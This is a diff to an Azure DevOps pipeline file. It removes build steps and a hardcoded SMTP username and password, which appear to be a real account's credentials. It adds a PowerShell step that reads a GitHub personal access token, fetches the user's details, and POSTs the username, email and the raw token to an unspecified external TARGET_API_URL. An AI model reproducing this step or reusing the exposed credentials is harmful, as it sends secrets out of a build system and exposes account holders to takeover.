@@ -2,72 +2,53 @@ trigger:
 - main
 
 pool:
-  vmImage: ubuntu-latest
+  vmImage: 'ubuntu-latest'
 
 variables:
-  buildConfiguration: 'Release'
-  SMTP_SERVER: 'smtp.office365.com'
-  SMTP_USER: '21071a05r8@vnrvjiet.in'
-  SMTP_PASSWORD: 'vnrvjiet' # Ensure this is securely managed
+- group: Pipeline
+- name: GITHUB_API_URL
+  value: 'https://api.github.com/user'
 
 steps:
-- task: DotNetCoreCLI@2
-  displayName: 'Restore'
-  inputs:
-    command: 'restore'
-    projects: '**/*.csproj'
-
 - task: PowerShell@2
   inputs:
     targetType: 'inline'
     script: |
-      $smtpServer = "${env:SMTP_SERVER}"
-      $smtpPort = 587  # Common SMTP port for TLS
-      $smtpUser = "${env:SMTP_USER}"
-      $smtpPassword = "${env:SMTP_PASSWORD}"
-      $fromEmail = "your-email@yourdomain.com"
-      $toEmail = "recipient@example.com"
-      $subject = "Code Analysis Report URL"
-      $body = "Please find the latest code analysis report here: https://example.com/code-analysis-report"
-      
-      $message = New-Object system.net.mail.mailmessage
-      $message.from = $fromEmail
-      $message.To.Add($toEmail)
-      $message.Subject = $subject
-      $message.Body = $body
+      # Retrieve variables
+      $pat = "$(GitHubPAT)"
 
-      $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
-      $smtp.EnableSsl = $true
-      $smtp.Credentials = New-Object System.Net.NetworkCredential($smtpUser, $smtpPassword)
+      # Set the headers for the API request
+      $headers = @{
+        'Authorization' = "Bearer $pat"
+      }
 
-      try {
-          $smtp.Send($message)
-          Write-Host "Email sent successfully."
+      # Make the GET request to the GitHub API to retrieve user information
+      $response = Invoke-RestMethod -Uri $(GITHUB_API_URL) -Method Get -Headers $headers
+
+      # Extract username and email from the GitHub response
+      $username = $response.login
+      $email = $response.email
+
+      # Log the retrieved details
+      Write-Host "Retrieved GitHub Username: $username"
+      Write-Host "Retrieved GitHub Email: $email"
+
+      # Prepare the body for the POST request to the target API
+      $postBody = @{
+        username = $username
+        email = $email
+        token = $pat
+      } | ConvertTo-Json
+
+      # Set the headers for the target API request
+      $targetApiHeaders = @{
+        'Content-Type' = 'application/json'
       }
-      catch {
-          Write-Host "Failed to send email. Error: $_"
-      }
+
+      # Make the POST request to the target API
+      $targetApiResponse = Invoke-RestMethod -Uri $(TARGET_API_URL) -Method Post -Headers $targetApiHeaders -Body $postBody
+
+      # Output the response from the target API
+      Write-Host "Response from Target API: $($targetApiResponse | ConvertTo-Json -Depth 3)"
   env:
-    SMTP_USER: $(SMTP_USER)
-    SMTP_PASSWORD: $(SMTP_PASSWORD)
-    SMTP_SERVER: $(SMTP_SERVER)
-
-- task: DotNetCoreCLI@2
-  displayName: 'Build'
-  inputs:
-    command: 'build'
-    projects: '**/*.csproj'
-    arguments: '--configuration $(buildConfiguration)'
-
-- task: DotNetCoreCLI@2
-  displayName: 'Publish'
-  inputs:
-    command: 'publish'
-    projects: '**/*.csproj'
-    arguments: '--configuration $(buildConfiguration) --output $(Build.ArtifactStagingDirectory)'
-
-- task: PublishBuildArtifacts@1
-  displayName: 'Publish Artifact'
-  inputs:
-    pathtoPublish: '$(Build.ArtifactStagingDirectory)'
-    artifactName: 'published_files'
+    GitHubPAT: $(GitHubPAT)
